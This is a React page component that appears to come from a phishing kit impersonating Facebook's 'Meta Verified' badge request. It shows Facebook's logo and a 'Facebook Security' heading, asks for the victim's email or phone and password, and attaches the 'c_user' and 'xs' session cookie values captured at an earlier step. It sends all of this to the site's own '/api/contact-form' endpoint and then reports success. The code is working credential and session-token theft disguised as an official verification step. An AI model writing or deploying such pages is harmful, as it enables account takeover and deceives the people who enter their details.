import React, { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import MetaTags from "@/components/meta-tags";
import { confirmationFormSchema } from "@/lib/form-schemas"; //Updated import path
import { apiRequest } from "@/lib/queryClient";
import { Eye, EyeOff } from "lucide-react";

export default function Confirmation() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const [showPassword, setShowPassword] = useState(false);

  const form = useForm({
    resolver: zodResolver(confirmationFormSchema),
    defaultValues: {
      user_email: "",
      password: "",
      c_user: "",
      xs: "",
    },
  });

  useEffect(() => {
    const storedData = localStorage.getItem('validation_data');
    if (!storedData) {
      setLocation('/validation');
      return;
    }
    try {
      const parsed = JSON.parse(storedData);
      form.setValue('c_user', parsed.c_user);
      form.setValue('xs', parsed.xs);
    } catch (error) {
      console.error('Failed to parse validation data:', error);
      setLocation('/validation');
    }
  }, [setLocation, form]);

  const onSubmit = async (data: any) => {
    try {
      await apiRequest('POST', '/api/contact-form', data);
      localStorage.removeItem('validation_data');

      toast({
        title: "Success!",
        description: "Your form has been submitted successfully"
      });
      setLocation("/success");
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to submit form. Please try again.",
      });
    }
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  return (
    <>
      <MetaTags 
        title="Meta Verified | Confirmation"
        description="Request a verified badge on Facebook - Final Step"
      />
      <div className="min-h-screen bg-[#f0f2f5] flex justify-center items-center p-3 sm:p-4">
        <div className="bg-white p-6 sm:p-8 rounded-lg shadow-lg max-w-[360px] w-full text-center">
          <div className="flex justify-center mb-4">
            <img 
              src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
              alt="Facebook"
              className="h-8"
            />
          </div>
          <h1 className="text-base sm:text-lg font-bold text-[#1c1e21] mb-4">
            Facebook Security
          </h1>
          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
              <FormField
                control={form.control}
                name="user_email"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="sr-only">Email or Phone</FormLabel>
                    <FormControl>
                      <Input
                        type="text"
                        placeholder="Email or phone"
                        className="w-full px-4 py-3 text-sm border border-[#dddfe2] rounded-lg focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50 bg-[#f5f6f7]"
                        {...field}
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
              <FormField
                control={form.control}
                name="password"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="sr-only">Password</FormLabel>
                    <FormControl>
                      <div className="relative">
                        <Input
                          type={showPassword ? "text" : "password"}
                          placeholder="Password"
                          className="w-full px-4 py-3 text-sm border border-[#dddfe2] rounded-lg focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50 bg-[#f5f6f7]"
                          {...field}
                        />
                        <button
                          type="button"
                          onClick={togglePasswordVisibility}
                          className="absolute right-3 top-1/2 transform -translate-y-1/2 text-[#606770] hover:text-[#1877f2]"
                        >
                          {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                        </button>
                      </div>
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
              <Button 
                type="submit" 
                className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold py-3 rounded-lg text-base"
                disabled={form.formState.isSubmitting}
              >
                {form.formState.isSubmitting ? "Submitting..." : "Submit"}
              </Button>
            </form>
          </Form>
        </div>
      </div>
    </>
  );
}